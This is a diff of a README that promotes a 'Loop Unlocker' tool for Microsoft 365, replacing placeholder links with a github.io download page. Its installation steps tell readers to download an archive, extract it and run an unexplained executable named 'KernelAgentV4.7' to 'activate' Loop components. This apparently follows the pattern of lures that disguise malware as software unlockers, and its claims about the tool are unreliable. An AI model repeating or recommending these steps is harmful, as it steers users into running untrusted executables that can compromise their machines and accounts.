@@ -2,13 +2,15 @@
 
 Activate Microsoft Loop components to create and share real-time collaborative content blocks across Microsoft 365 apps like Word, Outlook, and Teams. This tool unlocks Loop integration using `KernelAgentV4.7`.
 
-[![Download Loop Unlocker](https://img.shields.io/badge/Download-Loop_Components-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Loop Unlocker](https://img.shields.io/badge/Download-Loop_Components-blueviolet)](https://m365-loop-components-unlocker.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-loop-components-unlocker.github.io/.github
+) section  
 2. 📁 **Extract the folder** to a directory such as `C:\M365LoopUnlocker`  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to activate embedded Loop support  
 4. 🔁 Open Word, Outlook, or Teams → Insert → Loop Component  
